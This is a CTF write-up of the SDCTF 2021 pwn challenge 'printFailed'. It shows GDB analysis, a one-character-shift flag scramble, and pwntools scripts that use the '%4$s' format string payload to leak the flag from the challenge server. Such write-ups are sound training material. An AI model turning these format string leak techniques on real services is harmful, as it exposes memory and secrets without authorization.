---
layout: load_md
title: The White Circle | Sdctf 2021 | printFailed Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Sdctf 2021
parent: sdctf_2021
category: pwn
challenge: printFailed
tags: "pwn, twh, format string"
date: 2021-05-10T00:00:00+00:00
last_update: 2021-05-10T00:00:00+00:00
---

<h1 class="heading card-title white-text">Sdctf 2021</h1>

## printFailed
> Solved By : thewhiteh4t

* Right from the start we get a segfault on this binary

```bash
./printFailed
zsh: segmentation fault (core dumped)  ./printFailed
```

* Let's investigate in GDB

![](https://i.imgur.com/91Rzavz.png)

* It's trying to open **flag.txt** but it does not exist, I created the file and relaunched the binary and it works now

```bash
./printFailed
can you guess the scrambled flag?
yes
you guessed:
yes
wrong
```

* It prints the input, let's look into GDB again
* A scramble function is called soon after the file is read
* Here we can see the scrambled flag : 

![](https://i.imgur.com/itwobGI.png)

```
"tedug|g5l4`gm5h~\v", '\001' <repeats 22 times>
```

* this looks familiar

```
tedug|g5l4`gm5h~\v
sdctf{f4k3_fl4g}
```

* so the input is shifted by 1 character!
* let's try to input the scrambled flag in the local binary

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF('./printFailed')

guess = b'tedug|g5l4`gm5h~\v' + b'\001' * 22

p = elf.process()
p.send(guess)
out = p.recv(4096)
print(out)
```

![](https://i.imgur.com/z5MuV9f.png)

* the scrambled flag works!
* but now the issue is that we don't know the actual flag so we cannot make a scrambled flag
* earlier we saw that the binary prints the input, this hints at `format string exploit`
* this article helped a lot in figuring out the way forward
* https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b
* https://man7.org/linux/man-pages/man3/printf.3.html

```
%s   -> string
%2$s -> 2nd argument
%3$s -> 3rd argument
```

* I tried them one by one and `%4$s` leaks the scrambled flag! 

![](https://i.imgur.com/kPVOxuG.png)

* Here is the final script and output :

```python
#!/usr/bin/env python3

from pwn import *

host = 'printf.sdc.tf'
port = 1337

payload = b'%4$s'

conn = remote(host, port)
conn.send(payload + b'\n')
res = conn.recv(4096).decode().split('\n')[2]
conn.close()

print(res)

for char in res:
    print(chr(ord(char) - 1), end='')
```

**OUTPUT :**

![](https://i.imgur.com/DCmtMWZ.png)